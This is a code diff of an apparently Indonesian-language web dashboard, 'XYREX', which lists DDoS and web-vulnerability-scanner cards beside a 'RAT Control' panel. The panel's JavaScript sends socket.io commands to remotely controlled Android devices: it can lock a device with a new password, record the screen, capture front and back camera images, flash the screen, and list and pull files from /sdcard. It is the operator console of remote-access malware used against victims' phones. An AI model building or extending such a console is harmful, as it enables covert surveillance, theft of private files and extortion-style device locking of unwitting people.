@@ -36,7 +36,7 @@
   .bg-red { background: #dc2626; }
   .bg-black { background: #111; }
 
-  /* Panel RAT (Tersembunyi dulu) */
+  /* Panel RAT */
   #rat-panel { display: none; background: var(--white); border: 3px solid var(--ink); border-radius: 15px; box-shadow: 4px 4px 0 var(--ink); padding: 15px; margin-top: 10px; }
   #rat-panel h3 { margin-top: 0; border-bottom: 3px solid var(--ink); padding-bottom: 10px; }
   .rat-form-group { margin-bottom: 10px; }
@@ -60,144 +60,72 @@
   </header>
 
   <main>
-    <!-- Card 1: Video -->
     <div class="card" onclick="alert('Fitur bawaan')">
-      <div class="card-icon bg-pink">
-        <svg viewBox="0 0 24 24"><path d="M17 10.5V7a1 1 0 0 0-1-1H4a1 1 0 0 0-1 1v10a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-3.5l4 4v-11l-4 4z"/></svg>
-      </div>
-      <div class="card-content">
-        <div class="card-title">Video Download No Watermark</div>
-        <div class="card-desc">TikTok, Instagram, YouTube, Facebook</div>
-      </div>
-      <div class="card-arrow">›</div>
+      <div class="card-icon bg-pink"><svg viewBox="0 0 24 24"><path d="M17 10.5V7a1 1 0 0 0-1-1H4a1 1 0 0 0-1 1v10a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-3.5l4 4v-11l-4 4z"/></svg></div>
+      <div class="card-content"><div class="card-title">Video Download No Watermark</div><div class="card-desc">TikTok, Instagram, YouTube, Facebook</div></div><div class="card-arrow">›</div>
     </div>
-
-    <!-- Card 2: Gmail -->
     <div class="card" onclick="alert('Fitur bawaan')">
-      <div class="card-icon bg-orange">
-        <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
-      </div>
-      <div class="card-content">
-        <div class="card-title">Gmail Sementara</div>
-        <div class="card-desc">Email sekali pakai, otomatis hapus</div>
-      </div>
-      <div class="card-arrow">›</div>
+      <div class="card-icon bg-orange"><svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg></div>
+      <div class="card-content"><div class="card-title">Gmail Sementara</div><div class="card-desc">Email sekali pakai, otomatis hapus</div></div><div class="card-arrow">›</div>
     </div>
-
-    <!-- Card 3: Anime -->
     <div class="card" onclick="alert('Fitur bawaan')">
-      <div class="card-icon bg-purple">
-        <svg viewBox="0 0 24 24"><path d="M21 3H3c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h5v2h8v-2h5c1.1 0 1.99-.9 1.99-2L23 5c0-1.1-.9-2-2-2zm0 14H3V5h18v12z"/></svg>
-      </div>
-      <div class="card-content">
-        <div class="card-title">Nonton Anime</div>
-        <div class="card-desc">Streaming anime subtitle Indonesia</div>
-      </div>
-      <div class="card-arrow">›</div>
+      <div class="card-icon bg-purple"><svg viewBox="0 0 24 24"><path d="M21 3H3c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h5v2h8v-2h5c1.1 0 1.99-.9 1.99-2L23 5c0-1.1-.9-2-2-2zm0 14H3V5h18v12z"/></svg></div>
+      <div class="card-content"><div class="card-title">Nonton Anime</div><div class="card-desc">Streaming anime subtitle Indonesia</div></div><div class="card-arrow">›</div>
     </div>
-
-    <!-- Card 4: Music -->
     <div class="card" onclick="alert('Fitur bawaan')">
-      <div class="card-icon bg-green">
-        <svg viewBox="0 0 24 24"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>
-      </div>
-      <div class="card-content">
-        <div class="card-title">Music Downloader</div>
-        <div class="card-desc">Download lagu, putar di web</div>
-      </div>
-      <div class="card-arrow">›</div>
+      <div class="card-icon bg-green"><svg viewBox="0 0 24 24"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg></div>
+      <div class="card-content"><div class="card-title">Music Downloader</div><div class="card-desc">Download lagu, putar di web</div></div><div class="card-arrow">›</div>
     </div>
-
-    <!-- Card 5: Scanner -->
     <div class="card" onclick="alert('Fitur bawaan')">
-      <div class="card-icon bg-red">
-        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
-      </div>
-      <div class="card-content">
-        <div class="card-title">Web Scanner</div>
-        <div class="card-desc">Cari celah dasar (SQLi, XSS, LFI)</div>
-      </div>
-      <div class="card-arrow">›</div>
+      <div class="card-icon bg-red"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg></div>
+      <div class="card-content"><div class="card-title">Web Scanner</div><div class="card-desc">Cari celah dasar (SQLi, XSS, LFI)</div></div><div class="card-arrow">›</div>
     </div>
-
-    <!-- Card 6: DDoS -->
     <div class="card" onclick="alert('Fitur bawaan')">
-      <div class="card-icon bg-red">
-        <svg viewBox="0 0 24 24"><path d="M13 2.05v9.95l4-2.31v4.62L13 17v4.95l6-3.46V9.86l-4 2.31V5.51l-2-1.15-2 1.15v6.66l-4-2.31v8.63l6 3.46V17l-4-2.31v-4.62l4 2.31V2.05z"/></svg>
-      </div>
-      <div class="card-content">
-        <div class="card-title">DDoS Server</div>
-        <div class="card-desc">Serang web target hingga loop</div>
-      </div>
-      <div class="card-arrow">›</div>
+      <div class="card-icon bg-red"><svg viewBox="0 0 24 24"><path d="M13 2.05v9.95l4-2.31v4.62L13 17v4.95l6-3.46V9.86l-4 2.31V5.51l-2-1.15-2 1.15v6.66l-4-2.31v8.63l6 3.46V17l-4-2.31v-4.62l4 2.31V2.05z"/></svg></div>
+      <div class="card-content"><div class="card-title">DDoS Server</div><div class="card-desc">Serang web target hingga loop</div></div><div class="card-arrow">›</div>
     </div>
-
-    <!-- Card 7: RAT CONTROL (Baru) -->
+    
+    <!-- Card RAT (Menu ke-7) -->
     <div class="card" onclick="toggleRat()">
-      <div class="card-icon bg-black">
-        <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-5 11h-2v2h-2v-2H9v-2h2v-2h2v2h2v2z"/></svg>
-      </div>
-      <div class="card-content">
-        <div class="card-title">RAT Control</div>
-        <div class="card-desc">Kendali penuh jarak jauh (Android)</div>
-      </div>
-      <div class="card-arrow">›</div>
+      <div class="card-icon bg-black"><svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-5 11h-2v2h-2v-2H9v-2h2v-2h2v2h2v2z"/></svg></div>
+      <div class="card-content"><div class="card-title">RAT Control</div><div class="card-desc">Kendali penuh jarak jauh (Android)</div></div><div class="card-arrow">›</div>
     </div>
 
-    <!-- PANEL RAT -->
+    <!-- Panel RAT (Tersembunyi) -->
     <div id="rat-panel">
       <h3>XYREX RAT CONTROL</h3>
       <div class="rat-form-group">
         <label>Pilih Device:</label>
         <select id="rat-device-list"><option>Belum ada device</option></select>
       </div>
-      
       <div style="display:flex; gap:10px;">
-        <div class="rat-form-group" style="flex:1;">
-          <label>Interval Flash (ms):</label>
-          <input type="number" id="rat-flash-int" value="300">
-        </div>
-        <div class="rat-form-group" style="flex:1;">
-          <label>Durasi Flash (ms):</label>
-          <input type="number" id="rat-flash-dur" value="5000">
-        </div>
+        <div class="rat-form-group" style="flex:1;"><label>Interval Flash (ms):</label><input type="number" id="rat-flash-int" value="300"></div>
+        <div class="rat-form-group" style="flex:1;"><label>Durasi Flash (ms):</label><input type="number" id="rat-flash-dur" value="5000"></div>
       </div>
       <button class="neo-btn" onclick="ratSend('flash',{interval:+document.getElementById('rat-flash-int').value,duration:+document.getElementById('rat-flash-dur').value})">Eksekusi Flash</button>
-
       <div class="rat-form-group" style="margin-top:15px;">
         <label>Lock Device (Sandi Baru):</label>
-        <div style="display:flex; gap:10px;">
-          <input type="text" id="rat-lock-pass" value="1234">
-          <button class="neo-btn" style="width:80px; margin-top:0;" onclick="ratSend('lock',{password:document.getElementById('rat-lock-pass').value})">Lock</button>
-        </div>
+        <div style="display:flex; gap:10px;"><input type="text" id="rat-lock-pass" value="1234"><button class="neo-btn" style="width:80px; margin-top:0;" onclick="ratSend('lock',{password:document.getElementById('rat-lock-pass').value})">Lock</button></div>
       </div>
-
       <div class="rat-form-group">
         <label>Rekam Layar (Detik):</label>
-        <div style="display:flex; gap:10px;">
-          <input type="number" id="rat-rec-dur" value="15">
-          <button class="neo-btn" style="width:80px; margin-top:0;" onclick="ratSend('screen',{duration:+document.getElementById('rat-rec-dur').value})">Rekam</button>
-        </div>
+        <div style="display:flex; gap:10px;"><input type="number" id="rat-rec-dur" value="15"><button class="neo-btn" style="width:80px; margin-top:0;" onclick="ratSend('screen',{duration:+document.getElementById('rat-rec-dur').value})">Rekam</button></div>
       </div>
-
       <div style="display:flex; gap:10px; margin-bottom:10px;">
         <button class="neo-btn" onclick="ratSend('cam_front',{})">Cam Depan</button>
         <button class="neo-btn" onclick="ratSend('cam_back',{})">Cam Belakang</button>
       </div>
-
       <div class="rat-form-group">
         <label>Ambil File:</label>
         <input type="text" id="rat-file-path" value="/sdcard/Download/">
         <button class="neo-btn" onclick="ratSend('files',{path:document.getElementById('rat-file-path').value})">List / Ambil File</button>
       </div>
-
       <label style="font-weight:bold;">Output Log:</label>
       <pre id="rat-output">Idle...</pre>
     </div>
   </main>
 
   <script>
-    // Ambil nama user dari localStorage (kalau ada)
     const user = localStorage.getItem('xyrex_user');
     if (user) document.getElementById('user-name').textContent = user.toUpperCase();
 
@@ -209,7 +137,6 @@
 
     const socket = io('/rat');
     socket.on('connect', () => socket.emit('rat:list'));
-    
     socket.on('rat:devices', (list) => {
       const sel = document.getElementById('rat-device-list');
       sel.innerHTML = list.length ? '' : '<option>Belum ada device</option>';
